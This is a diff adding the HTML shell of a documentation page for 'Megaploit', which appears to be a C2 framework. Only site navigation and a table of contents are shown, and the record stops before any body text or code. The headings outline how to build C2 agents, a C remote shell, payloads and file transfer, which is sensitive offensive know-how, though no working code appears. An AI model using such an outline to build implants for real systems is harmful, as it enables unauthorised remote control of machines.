@@ -1,0 +1,2239 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Professional C2 Framework & Security Research Toolbox">
+      
+      
+      
+        <link rel="canonical" href="https://josefifir.github.io/Megaploit/C_PLUGIN_DEVELOPMENT/">
+      
+      
+        <link rel="prev" href="../NETWORKING/">
+      
+      
+      
+        
+      
+      
+      <link rel="icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
+    
+    
+      
+        <title>C Plugin Development - Megaploit</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.ec1eaa64.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="deep-purple" data-md-color-accent="purple">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#c-plugin-development-guide" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href=".." title="Megaploit" class="md-header__button md-logo" aria-label="Megaploit" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Megaploit
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              C Plugin Development
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="deep-purple" data-md-color-accent="purple"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="deep-purple" data-md-color-accent="purple"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/Josefifir/Megaploit" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    Josefifir/Megaploit
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href=".." class="md-tabs__link">
+        
+  
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../ARCHITECTURE/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Architecture
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../CLI_REFERENCE/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  CLI Reference
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../MODULE_SYSTEM/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Module System
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../PAYLOAD_BUILDER/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Payload Builder
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../PIPELINE/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Pipeline
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../C2_PROFILE/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Malleable C2 Profile
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../WEB_DASHBOARD/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Web Dashboard
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../NETWORKING/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Networking
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    <li class="md-tabs__item md-tabs__item--active">
+      <a href="./" class="md-tabs__link">
+        
+  
+  
+    
+  
+  C Plugin Development
+
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href=".." title="Megaploit" class="md-nav__button md-logo" aria-label="Megaploit" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Megaploit
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/Josefifir/Megaploit" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    Josefifir/Megaploit
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href=".." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ARCHITECTURE/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Architecture
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CLI_REFERENCE/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CLI Reference
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../MODULE_SYSTEM/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Module System
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../PAYLOAD_BUILDER/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Payload Builder
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../PIPELINE/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Pipeline
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../C2_PROFILE/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Malleable C2 Profile
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../WEB_DASHBOARD/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web Dashboard
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../NETWORKING/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Networking
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    C Plugin Development
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    C Plugin Development
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#contents" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Contents
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1-native-operator-tool" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Native Operator Tool
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="1. Native Operator Tool">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#11-minimal-example" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1.1 Minimal example
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#12-plugin-descriptor-fields" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1.2 Plugin descriptor fields
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#13-placeholders" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1.3 Placeholders
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#14-compiler-selection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1.4 Compiler selection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#15-binary-caching" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1.5 Binary caching
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#16-output-formats" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1.6 Output formats
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-wire-protocol-reference" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Wire Protocol Reference
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2. Wire Protocol Reference">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#21-message-framing" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.1 Message framing
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#22-plaintext-payload-v1-unencrypted" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.2 Plaintext payload (v1 / unencrypted)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#23-encrypted-payload-v2-aes-256-gcm" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.3 Encrypted payload (v2, AES-256-GCM)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#24-connection-handshake-sequence" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.4 Connection handshake sequence
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#25-replay-protection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.5 Replay protection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#26-protocol-constants" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.6 Protocol constants
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-c2-agent-implementation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. C2 Agent Implementation
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3. C2 Agent Implementation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#31-minimal-agent-skeleton-c-plaintext" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3.1 Minimal agent skeleton (C, plaintext)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#32-tls-wrapping-recommended" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3.2 TLS wrapping (recommended)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#33-json-encoding-rules" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3.3 JSON encoding rules
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#34-file-transfer-protocol" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3.4 File transfer protocol
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-c-remote-shell-as-the-reference-agent" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. C-remote-shell as the Reference Agent
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4. C-remote-shell as the Reference Agent">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#41-key-files-to-study" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.1 Key files to study
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#42-the-four-security-layers-in-order" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.2 The four security layers (in order)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#43-verb-dispatch-pattern" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.3 Verb dispatch pattern
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-c2-compliance-probe" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. C2 Compliance Probe
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5. C2 Compliance Probe">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#51-signals-checked" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.1 Signals checked
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#52-auto-registration-of-c-exclusive-verbs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.2 Auto-registration of C-exclusive verbs
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6-megaploit_protocolh-api" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6. megaploit_protocol.h API
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="6. megaploit_protocol.h API">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#61-connection-state" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6.1 Connection state
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#62-core-functions" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6.2 Core functions
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#63-error-codes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6.3 Error codes
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#64-aes-256-gcm-openssl" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6.4 AES-256-GCM (OpenSSL)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#65-windows-schannel-alternative" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6.5 Windows (SChannel) alternative
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7-common-pitfalls" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7. Common Pitfalls
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#8-compiler-requirements" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        8. Compiler Requirements
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="8. Compiler Requirements">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#native-plugins-kind-native" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Native plugins (kind = "native")
+      
+    </span>
+  </a>
+  
+</li>
